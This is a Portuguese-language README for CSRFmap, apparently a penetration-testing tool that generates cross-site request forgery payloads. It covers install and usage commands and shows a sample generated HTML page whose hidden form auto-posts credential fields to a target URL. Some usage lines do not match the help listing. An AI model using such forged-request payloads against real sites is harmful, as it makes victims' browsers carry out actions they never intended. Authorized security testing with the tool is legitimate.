<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=CSRFmap)](https://git.io/typing-svg)



<h4 align="center"> Tool to generate payloads focused on CSRF </h4>


<p align="center">
  <a href="#características">Features</a> •
  <a href="#instalação">Install</a> •
  <a href="#forma-de-utilização">How to use</a> •
  <a href="#executando-revshell">Usage</a>
</p>

---


O CSRFmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.

Projetei o `CSRFmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.

# Características

 - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.

# Forma de utilização

```sh
python3 CSRFmap.py -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
```
Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
```yaml
  ____________  ____              
 / ___/ __/ _ \/ __/_ _  ___ ____ 
/ /___\ \/ , _/ _//  ' \/ _ `/ _ \
\___/___/_/|_/_/ /_/_/_/\_,_/ .__/
                           /_/ 
                           Autor: joaovictorti
                           version: 1.1 

options:
  -h, --help            show this help message and exit
  -a ACTION, -A ACTION  Insert action
  -m METHOD, -M METHOD  Insert method
  -p {form1,form2,json1,json2}
  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values

```

# Instalação

CSRFmap requer **python3** e para baixá-lo só usar:

```sh
git clone https://github.com/joaoviictorti/CSRFmap
```

# Executando CSRFmap

```console
python3 CSRFmap.py -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542

  ____________  ____              
 / ___/ __/ _ \/ __/_ _  ___ ____ 
/ /___\ \/ , _/ _//  ' \/ _ `/ _ \
\___/___/_/|_/_/ /_/_/_/\_,_/ .__/
                           /_/ 
                           Autor: joaovictorti
                           version: 1.1
                                               

csrf.html:
<!DOCTYPE html>
<html lang="pt-br">
<body>
	<form action="http://exemplo.com" method="post">
	<input name="username" value="victor" type="hidden"/>
	<input name="password" value="password" type="hidden"/>
	<input name="token" value="132423542" type="hidden"/>
	<input type="submit">Enviar</input>
	</form>
</body>
</html>

```


<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
